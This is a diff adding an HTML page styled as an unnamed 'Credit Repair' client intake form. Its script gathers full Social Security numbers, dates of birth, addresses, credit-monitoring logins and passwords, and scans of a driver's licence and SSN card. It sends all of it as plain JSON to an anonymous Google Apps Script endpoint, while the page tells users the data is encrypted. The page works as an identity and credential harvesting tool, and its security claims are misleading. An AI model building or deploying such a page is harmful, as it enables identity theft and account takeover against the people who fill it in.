@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Credit Repair — Client Intake</title>
+<style>
+  :root {
+    --dark-blue: #0a1a3d;
+    --navy: #0f2455;
+    --blue: #2f5fd6;
+    --blue-light: #5b82e8;
+    --silver: #c7ccd6;
+    --silver-dim: #8b93a3;
+    --white: #f4f6fa;
+    --error: #ff6b6b;
+    --success: #4cd58a;
+    --card-bg: #12235291;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+    background: linear-gradient(160deg, var(--dark-blue) 0%, #050b1a 100%);
+    color: var(--white);
+    min-height: 100vh;
+    display: flex;
+    align-items: flex-start;
+    justify-content: center;
+    padding: 30px 16px;
+  }
+
+  .wrap { width: 100%; max-width: 640px; }
+
+  header { text-align: center; margin-bottom: 24px; }
+  header .crest {
+    width: 52px; height: 52px; margin: 0 auto 10px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, var(--blue), var(--silver));
+    display: flex; align-items: center; justify-content: center;
+    font-size: 26px;
+  }
+  header h1 { font-size: 1.7rem; font-weight: 700; letter-spacing: 0.5px; }
+  header h1 span { color: var(--blue-light); }
+  header p { color: var(--silver-dim); font-size: 0.85rem; margin-top: 6px; }
+
+  .progress-bar {
+    display: flex; justify-content: space-between; margin-bottom: 26px; gap: 6px;
+  }
+  .progress-seg {
+    flex: 1; height: 5px; border-radius: 4px; background: #ffffff17; transition: background 0.3s;
+  }
+  .progress-seg.active, .progress-seg.done { background: linear-gradient(90deg, var(--blue), var(--silver)); }
+
+  .card {
+    background: var(--card-bg);
+    border: 1px solid #ffffff14;
+    border-radius: 16px;
+    padding: 30px 28px;
+    backdrop-filter: blur(6px);
+  }
+
+  .step { display: none; }
+  .step.active { display: block; animation: fadeIn 0.35s ease; }
+  @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
+
+  .step h2 { font-size: 1.15rem; margin-bottom: 4px; color: var(--white); }
+  .step .step-sub { color: var(--silver-dim); font-size: 0.82rem; margin-bottom: 20px; }
+
+  .field { margin-bottom: 16px; }
+  .field label { display: block; font-size: 0.82rem; color: var(--silver); margin-bottom: 6px; font-weight: 600; }
+  .field .note { font-weight: 400; color: var(--silver-dim); font-size: 0.75rem; margin-left: 6px; }
+
+  .field input[type=text], .field input[type=date], .field input[type=email], .field input[type=password] {
+    width: 100%; padding: 12px 14px; border-radius: 9px; border: 1px solid #ffffff26;
+    background: #ffffff0d; color: var(--white); font-size: 0.92rem; outline: none;
+    transition: border-color 0.2s, background 0.2s;
+  }
+  .field input:focus { border-color: var(--blue-light); background: #ffffff17; }
+  .field input::placeholder { color: #6b7690; }
+
+  .pw-wrap { position: relative; }
+  .pw-wrap .toggle-pw {
+    position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
+    cursor: pointer; font-size: 0.78rem; color: var(--blue-light); user-select: none;
+  }
+
+  .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+
+  .upload-box {
+    border: 1.5px dashed #ffffff33; border-radius: 10px; padding: 20px 14px;
+    text-align: center; cursor: pointer; transition: border-color 0.2s, background 0.2s;
+    position: relative;
+  }
+  .upload-box:hover { border-color: var(--blue-light); background: #ffffff08; }
+  .upload-box.filled { border-color: var(--success); background: #4cd58a12; }
+  .upload-box .up-icon { font-size: 1.4rem; margin-bottom: 6px; }
+  .upload-box .up-label { font-size: 0.85rem; color: var(--silver); font-weight: 600; }
+  .upload-box .up-filename { font-size: 0.75rem; color: var(--success); margin-top: 6px; word-break: break-all; }
+  .upload-box input[type=file] { display: none; }
+
+  .notice {
+    background: #2f5fd61a; border: 1px solid #2f5fd655; border-radius: 9px;
+    padding: 12px 15px; font-size: 0.8rem; color: var(--silver); margin-bottom: 20px; line-height: 1.5;
+  }
+
+  .review-section { margin-bottom: 18px; }
+  .review-section h3 {
+    font-size: 0.8rem; text-transform: uppercase; letter-spacing: 0.5px;
+    color: var(--blue-light); margin-bottom: 10px; padding-bottom: 8px; border-bottom: 1px solid #ffffff1c;
+  }
+  .review-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px 20px; }
+  .review-item label { display: block; font-size: 0.7rem; color: var(--silver-dim); text-transform: uppercase; }
+  .review-item p { font-size: 0.9rem; color: var(--white); margin-top: 3px; word-break: break-word; }
+
+  .btn-row { display: flex; justify-content: space-between; margin-top: 26px; gap: 12px; }
+  .btn {
+    padding: 12px 24px; border-radius: 9px; border: none; font-size: 0.88rem; font-weight: 700;
+    cursor: pointer; transition: transform 0.15s, opacity 0.15s; letter-spacing: 0.3px;
+  }
+  .btn:active { transform: scale(0.97); }
+  .btn-primary { background: linear-gradient(90deg, var(--blue), var(--blue-light)); color: white; margin-left: auto; }
+  .btn-secondary { background: #ffffff14; color: var(--silver); }
+  .btn-silver { background: linear-gradient(90deg, var(--silver), #e8ecf2); color: var(--dark-blue); margin-left: auto; }
+  .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+  .status-msg { margin-top: 14px; font-size: 0.83rem; font-weight: 600; text-align: center; min-height: 18px; }
+  .msg-error { color: var(--error); }
+  .msg-info { color: var(--silver-dim); }
+
+  #success-screen { display: none; text-align: center; padding: 20px 10px; }
+  #success-screen .success-icon { font-size: 3rem; margin-bottom: 14px; }
+  #success-screen h2 { font-size: 1.3rem; margin-bottom: 8px; }
+  #success-screen h2 span { color: var(--blue-light); }
+  #success-screen .client-id { font-size: 0.95rem; color: var(--silver); background: #ffffff0f; padding: 8px 16px; border-radius: 8px; display: inline-block; margin: 10px 0; }
+  #success-screen p { color: var(--silver-dim); font-size: 0.88rem; line-height: 1.7; }
+
+  @media (max-width: 560px) {
+    .form-row, .review-grid { grid-template-columns: 1fr; }
+    .card { padding: 24px 18px; }
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <header>
+    <div class="crest">🛡️</div>
+    <h1>Credit <span>Repair</span></h1>
+    <p>Secure &amp; Confidential Client Intake — Please complete all 5 steps</p>
+  </header>
+
+  <div class="progress-bar" id="progress-bar">
+    <div class="progress-seg active" data-seg="1"></div>
+    <div class="progress-seg" data-seg="2"></div>
+    <div class="progress-seg" data-seg="3"></div>
+    <div class="progress-seg" data-seg="4"></div>
+    <div class="progress-seg" data-seg="5"></div>
+  </div>
+
+  <div class="card" id="form-card">
+
+    <!-- Step 1: Personal Info -->
+    <div class="step active" data-step="1">
+      <h2>Personal Information</h2>
+      <p class="step-sub">Let's start with the basics.</p>
+      <div class="form-row">
+        <div class="field">
+          <label>First Name</label>
+          <input type="text" id="firstName" placeholder="John">
+        </div>
+        <div class="field">
+          <label>Last Name</label>
+          <input type="text" id="lastName" placeholder="Doe">
+        </div>
+      </div>
+      <div class="field">
+        <label>Date of Birth</label>
+        <input type="date" id="dob">
+      </div>
+      <div class="field">
+        <label>Full Address</label>
+        <input type="text" id="address" placeholder="123 Main St, City, State, ZIP">
+      </div>
+      <div class="status-msg msg-error" id="status-msg-1"></div>
+      <div class="btn-row">
+        <button class="btn btn-primary" onclick="goToStep(2)">Next Step →</button>
+      </div>
+    </div>
+
+    <!-- Step 2: SSN & Email -->
+    <div class="step" data-step="2">
+      <h2>Identification &amp; Contact</h2>
+      <p class="step-sub">This information is encrypted and used only for your credit repair process.</p>
+      <div class="notice">🔒 Your Social Security Number is transmitted securely and used solely for identity verification with the credit bureaus.</div>
+      <div class="field">
+        <label>Full Social Security Number</label>
+        <input type="text" id="ssn" placeholder="123-45-6789" maxlength="11">
+      </div>
+      <div class="field">
+        <label>Email Address <span class="note">For update purposes only</span></label>
+        <input type="email" id="email" placeholder="you@example.com">
+      </div>
+      <div class="status-msg msg-error" id="status-msg-2"></div>
+      <div class="btn-row">
+        <button class="btn btn-secondary" onclick="goToStep(1)">← Back</button>
+        <button class="btn btn-primary" onclick="goToStep(3)">Next Step →</button>
+      </div>
+    </div>
+
+    <!-- Step 3: Credit Monitoring -->
+    <div class="step" data-step="3">
+      <h2>Credit Monitoring Login</h2>
+      <p class="step-sub">SmartCredit.com or MyFreeScoreNow — whichever you use.</p>
+      <div class="field">
+        <label>Username</label>
+        <input type="text" id="scUser" placeholder="Your login username">
+      </div>
+      <div class="field">
+        <label>Password</label>
+        <div class="pw-wrap">
+          <input type="password" id="scPass" placeholder="Your login password">
+          <span class="toggle-pw" onclick="togglePw('scPass', this)">Show</span>
+        </div>
+      </div>
+      <div class="status-msg msg-error" id="status-msg-3"></div>
+      <div class="btn-row">
+        <button class="btn btn-secondary" onclick="goToStep(2)">← Back</button>
+        <button class="btn btn-primary" onclick="goToStep(4)">Next Step →</button>
+      </div>
+    </div>
+
+    <!-- Step 4: Documents -->
+    <div class="step" data-step="4">
+      <h2>Upload Documents</h2>
+      <p class="step-sub">Clear photos or scans work fine.</p>
+
+      <div class="field">
+        <label>Driver's License</label>
+        <div class="upload-box" id="box-dl" onclick="document.getElementById('dlUpload').click()">
+          <div class="up-icon">🪪</div>
+          <div class="up-label">Click to upload</div>
+          <div class="up-filename" id="fname-dl"></div>
+        </div>
+        <input type="file" id="dlUpload" accept="image/*,.pdf" onchange="handleFile(this, 'dl')">
+      </div>
+
+      <div class="field">
+        <label>Proof of Address</label>
+        <div class="upload-box" id="box-poa" onclick="document.getElementById('poaUpload').click()">
+          <div class="up-icon">🏠</div>
+          <div class="up-label">Click to upload</div>
+          <div class="up-filename" id="fname-poa"></div>
+        </div>
+        <input type="file" id="poaUpload" accept="image/*,.pdf" onchange="handleFile(this, 'poa')">
+      </div>
+
+      <div class="field">
+        <label>SSN ID</label>
+        <div class="upload-box" id="box-ssnid" onclick="document.getElementById('ssnIdUpload').click()">
+          <div class="up-icon">🪪</div>
+          <div class="up-label">Click to upload</div>
+          <div class="up-filename" id="fname-ssnid"></div>
+        </div>
+        <input type="file" id="ssnIdUpload" accept="image/*,.pdf" onchange="handleFile(this, 'ssnid')">
+      </div>
+
+      <div class="status-msg msg-error" id="status-msg-4"></div>
+      <div class="btn-row">
+        <button class="btn btn-secondary" onclick="goToStep(3)">← Back</button>
+        <button class="btn btn-primary" onclick="goToStep(5)">Next Step →</button>
+      </div>
+    </div>
+
+    <!-- Step 5: Review -->
+    <div class="step" data-step="5">
+      <h2>Review &amp; Submit</h2>
+      <p class="step-sub">Please confirm everything looks correct.</p>
+
+      <div class="review-section">
+        <h3>Personal Info</h3>
+        <div class="review-grid">
+          <div class="review-item"><label>First Name</label><p id="r-firstName">—</p></div>
+          <div class="review-item"><label>Last Name</label><p id="r-lastName">—</p></div>
+          <div class="review-item"><label>Date of Birth</label><p id="r-dob">—</p></div>
+          <div class="review-item" style="grid-column:1/-1"><label>Address</label><p id="r-address">—</p></div>
+        </div>
+      </div>
+
+      <div class="review-section">
+        <h3>Identification &amp; Contact</h3>
+        <div class="review-grid">
+          <div class="review-item"><label>SSN</label><p id="r-ssn">—</p></div>
+          <div class="review-item"><label>Email</label><p id="r-email">—</p></div>
+        </div>
+      </div>
+
+      <div class="review-section">
+        <h3>Credit Monitoring</h3>
+        <div class="review-grid">
+          <div class="review-item"><label>Username</label><p id="r-scUser">—</p></div>
+          <div class="review-item"><label>Password</label><p id="r-scPass">—</p></div>
+        </div>
+      </div>
+
+      <div class="review-section">
+        <h3>Documents</h3>
+        <div class="review-grid">
+          <div class="review-item"><label>Driver's License</label><p id="r-dl">—</p></div>
+          <div class="review-item"><label>Proof of Address</label><p id="r-poa">—</p></div>
+          <div class="review-item"><label>SSN ID</label><p id="r-ssnid">—</p></div>
+        </div>
+      </div>
+
+      <div class="status-msg msg-info" id="status-msg-5"></div>
+      <div class="btn-row">
+        <button class="btn btn-secondary" onclick="goToStep(4)">← Back</button>
+        <button class="btn btn-silver" id="submit-btn" onclick="submitForm()">✓ Submit</button>
+      </div>
+    </div>
+
+    <!-- Success -->
+    <div id="success-screen">
+      <div class="success-icon">✅</div>
+      <h2>Intake <span>Complete!</span></h2>
+      <div class="client-id" id="success-client-id"></div>
+      <p>
+        Your information has been securely submitted.<br>
+        A confirmation email has been sent to <strong id="success-email"></strong>.<br>
+        Your Credit Repair specialist will be in touch shortly.
+      </p>
+    </div>
+
+  </div>
+</div>
+
+<script>
+  // ===== CONFIGURATION =====
+  const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyheRG7pu_06OTrcifzgvoZhCqfkwtZJtkzrmLUOprkZSxlig1oKwIfnMMWCKxJoI5o/exec';
+  // ==========================
+
+  let currentStep = 1;
+  const totalSteps = 5;
+  const files = { dl: null, poa: null, ssnid: null };
+
+  function goToStep(step) {
+    if (step > currentStep && !validateStep(currentStep)) return;
+    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+    document.querySelector(`.step[data-step="${step}"]`).classList.add('active');
+    document.querySelectorAll('.progress-seg').forEach((seg, i) => {
+      seg.classList.remove('active', 'done');
+      if (i + 1 < step) seg.classList.add('done');
+      else if (i + 1 === step) seg.classList.add('active');
+    });
+    currentStep = step;
+    if (step === 5) populateReview();
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+
+  function validateStep(step) {
+    const msg = document.getElementById(`status-msg-${step}`);
+    msg.textContent = '';
+    if (step === 1) {
+      if (!val('firstName') || !val('lastName') || !val('dob') || !val('address')) {
+        msg.textContent = 'Please fill in all fields.'; return false;
+      }
+    }
+    if (step === 2) {
+      if (!val('ssn') || !val('email')) { msg.textContent = 'Please fill in all fields.'; return false; }
+      if (!/^\S+@\S+\.\S+$/.test(val('email'))) { msg.textContent = 'Please enter a valid email.'; return false; }
+    }
+    if (step === 3) {
+      if (!val('scUser') || !val('scPass')) { msg.textContent = 'Please fill in all fields.'; return false; }
+    }
+    if (step === 4) {
+      if (!files.dl || !files.poa || !files.ssnid) { msg.textContent = 'Please upload all three documents.'; return false; }
+    }
+    return true;
+  }
+
+  function val(id) { return document.getElementById(id).value.trim(); }
+
+  function togglePw(id, el) {
+    const input = document.getElementById(id);
+    if (input.type === 'password') { input.type = 'text'; el.textContent = 'Hide'; }
+    else { input.type = 'password'; el.textContent = 'Show'; }
+  }
+
+  function handleFile(input, key) {
+    const file = input.files[0];
+    if (!file) return;
+    const reader = new FileReader();
+    reader.onload = function(e) {
+      files[key] = { name: file.name, mimeType: file.type || 'application/octet-stream', data: e.target.result.split(',')[1] };
+      document.getElementById(`box-${key === 'ssnid' ? 'ssnid' : key}`).classList.add('filled');
+      document.getElementById(`fname-${key}`).textContent = '✓ ' + file.name;
+    };
+    reader.readAsDataURL(file);
+  }
+
+  function populateReview() {
+    document.getElementById('r-firstName').textContent = val('firstName');
+    document.getElementById('r-lastName').textContent = val('lastName');
+    document.getElementById('r-dob').textContent = val('dob');
+    document.getElementById('r-address').textContent = val('address');
+    document.getElementById('r-ssn').textContent = val('ssn');
+    document.getElementById('r-email').textContent = val('email');
+    document.getElementById('r-scUser').textContent = val('scUser');
+    document.getElementById('r-scPass').textContent = '•'.repeat(val('scPass').length);
+    document.getElementById('r-dl').textContent = files.dl ? files.dl.name : '—';
+    document.getElementById('r-poa').textContent = files.poa ? files.poa.name : '—';
+    document.getElementById('r-ssnid').textContent = files.ssnid ? files.ssnid.name : '—';
+  }
+
+  function submitForm() {
+    const btn = document.getElementById('submit-btn');
+    const msg = document.getElementById('status-msg-5');
+    btn.disabled = true; btn.textContent = 'Submitting...';
+    msg.className = 'status-msg msg-info';
+    msg.textContent = 'Uploading your information, please wait...';
+
+    const payload = {
+      firstName: val('firstName'),
+      lastName: val('lastName'),
+      dob: val('dob'),
+      address: val('address'),
+      ssn: val('ssn'),
+      email: val('email'),
+      scUser: val('scUser'),
+      scPass: val('scPass'),
+      dl: files.dl,
+      poa: files.poa,
+      ssnid: files.ssnid
+    };
+
+    fetch(SCRIPT_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'text/plain;charset=utf-8' },
+      body: JSON.stringify(payload)
+    })
+      .then(r => r.json())
+      .then(res => {
+        if (res.result === 'success') {
+          document.getElementById('form-card').style.display = 'none';
+          document.getElementById('progress-bar').style.display = 'none';
+          document.getElementById('success-screen').style.display = 'block';
+          document.getElementById('success-client-id').textContent = res.clientId;
+          document.getElementById('success-email').textContent = val('email');
+        } else {
+          msg.className = 'status-msg msg-error';
+          msg.textContent = 'Something went wrong. Please try again or contact us directly.';
+          btn.disabled = false; btn.textContent = '✓ Submit';
+        }
+      })
+      .catch(() => {
+        msg.className = 'status-msg msg-error';
+        msg.textContent = 'Connection error. Please check your internet and try again.';
+        btn.disabled = false; btn.textContent = '✓ Submit';
+      });
+  }
+
+</script>
+</body>
+</html>
